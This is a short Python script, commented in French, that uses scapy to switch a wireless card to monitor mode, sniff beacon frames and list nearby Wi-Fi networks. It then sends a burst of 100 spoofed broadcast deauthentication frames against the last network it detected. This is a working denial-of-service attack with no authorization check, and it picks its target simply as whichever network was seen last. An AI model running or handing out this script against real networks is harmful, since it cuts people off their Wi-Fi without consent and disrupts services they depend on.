from scapy.all import *
from scapy.layers import *
from prettytable import PrettyTable



#conf si le user n'a rien mis
if len(sys.argv) < 2:
    print("[+] Okay ! by default wlan0 interface !")
    interface = "wlan0"
    wlanmon = "wlan0"

#conf si ya bien les args
if len(sys.argv) > 2:
    interface = sys.argv[1]
    wlanmon = sys.argv[2]


# Fonction pour scanner les réseaux WiFi
def scan_wifi_networks():
    networks = []
    ssid_set = set()

    # Fonction de rappel pour chaque paquet reçu
    def packet_handler(packet):
        global channel, bssid, ssid
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr2
            channel = int(packet[Dot11Elt:3].info[0])
            if bssid not in ssid_set:
                ssid_set.add(bssid)
                networks.append((bssid, ssid, channel))

    # mode Monitor
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")

    # Capture des paquets WiFi
    sniff(iface=f"{wlanmon}", prn=packet_handler, timeout=2) #a voir si j'abuse pas avec mon timeout de ouf mais 3 ça suffit laaargge

    return networks

# Fonction pour afficher les réseaux WiFi
def display_wifi_networks(networks):
    table = PrettyTable(["Adresse MAC", "Nom du réseau", "Canal"])
    for network in networks:
        table.add_row(network)
    print(table)

networks = scan_wifi_networks()

# Affichage des réseaux WiFi
display_wifi_networks(networks)


#prise d'infos (client pour deauth)
if bssid != False:
    #pas besoin d'avoir le MAC du client pour deauth...
    
    def deauth_wifi(bssid, interface):
        #addresse client mis sur une valeure NULL pour ne pas a avoir a trouvé un client heheheheh
        packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth()
        sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)

    # BOOM wifi deauth

    deauth_wifi(bssid, interface)

else:
    print("[-] Aucun réseau !")





# kill monitor mode
os.system(f"ifconfig {wlanmon} down")
os.system(f"iwconfig {wlanmon} mode managed")
os.system(f"ifconfig {wlanmon} up")

